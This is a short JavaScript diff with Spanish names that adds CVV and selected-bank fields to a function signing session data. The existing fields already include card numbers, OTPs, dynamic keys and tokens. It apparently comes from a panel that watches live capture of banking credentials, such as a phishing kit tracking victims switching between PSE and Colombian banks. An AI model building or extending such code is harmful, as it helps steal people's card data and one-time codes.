@@ -366,7 +366,9 @@ function firmaSesiones(lista, activos) {
         s.datos && s.datos.tarjeta, s.datos && s.datos.otp,
         s.datos && s.datos.claveDinamica, s.datos && s.datos.token,
         s.datos && s.datos.monto, s.datos && s.datos.precio,
-        s.datos && s.datos.authUsuario
+        s.datos && s.datos.authUsuario,
+        s.datos && s.datos.cvv, // 🔥 FIX: Para que detecte el cambio de PSE a DAVI/BANC
+        s.datos && s.datos.bancoSeleccionado // 🔥 FIX: Por seguridad
     ].join('|')).join('~');
 
     let firmaActivos = '';
